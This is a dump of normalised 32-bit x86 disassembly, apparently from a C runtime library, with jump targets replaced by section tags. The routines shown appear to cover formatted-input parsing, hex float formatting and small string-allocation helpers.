add eax 0x4
mov [ ebp - 0x1e4 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov esi ebx
je r-xdata
mov [ ebp - 0x1a1 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_1004fd6f
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ebx eax
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10037c91
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
dec [ ebp - 0x1a2 ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x1c4 ]
movzx eax bl
push eax
call sub_1001b50a
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_1001b50a
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x1a1 ] 0x1
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10037c91
pop ecx
pop ecx
mov esi [ ebp - 0x1b0 ]
inc [ ebp - 0x1a2 ]
inc esi
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
shl [ ebp - 0x1c4 ] 0x4
push ebx
call sub_1007b763
mov ebx eax
mov eax [ ebp - 0x1c4 ]
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_100318af
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x4
shl eax 0x4
push ebx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_1007b763
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_100318af
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_10079a10
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x1a3 ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x196 ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_10037c91
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_10037c91
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_10037c91
pop ecx
pop ecx
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
cmp [ ebp - 0x1c0 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1c4 ]
imul eax eax 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_1007c530
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1c8 ]
cmp [ ebp - 0x1e8 ] 0x63
je r-xdata
push 0x78
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
mov [ ebp - 0x1ac ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_100318af
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x1c4 ] eax
je r-xdata
mov eax [ ebp - 0x1c4 ]
shl eax 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
call sub_1004fd6f
cmp [ ebp - 0x1a1 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
movsx edi [ ebp - 0x1a3 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a3 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_10012962
pop ecx
test eax eax
je r-xdata
mov edi [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_10037c91
pop ecx
pop ecx
push 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov edi [ ebp - 0x1e8 ]
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007b70c
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
mov eax [ ebp - 0x204 ]
mov [ ebp - 0x1f0 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
call sub_10022954
mov ax [ ebp - 0x1f0 ]
add esp 0x10
mov [ ebx ] ax
add ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x1df ] al
mov [ ebp - 0x194 ] ebx
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a3 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007b70c
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_10037c91
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007b70c
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_100318af
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1a8 ]
inc [ ebp - 0x1c8 ]
lea ecx [ ebp - 0x204 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_1007b70c
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007b70c
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_100318af
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1007b70c
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_1007b783
mov [ ebp - 0x194 ] eax
movzx eax al
sub_10060a10
push ebp
mov ebp esp
push 0xffffffff
push sub_100824c0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
test [ eax + edi + 0x14 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_1003c700
sub_10060ac0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10060b10
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_1002f4c0
mov [ esi + 0x4 ] 0x3
cmp [ ebx + 0x84 ] 0x8
jb r-xdata
add ebx 0x70
mov ebx [ ebx + 0x70 ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_100796a0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10060ba3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_10060bcb
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_10003b16
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_10060bf0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005f7e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10060c20
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov edx eax
pop edi
mov [ edx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
test esi esi
jne r-xdata
push eax
push r--data
call sub_1003bee0
mov ecx [ edi + 0x8 ]
add esp 0x8
pop edi
mov [ ecx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
sub_10060c62
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_1006a508
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1004fd6f
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1004fd6f
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_1001d849
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10050c06
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_1007d990
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1007daa0
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1007daa0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10079a10
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_1007daa0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_1007d9c0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_1007d9c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_1007d9c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10060fe0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ edx + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
mov edx [ edx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
add edx eax
push edx
push eax
push esi
call sub_10020cc0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10061020
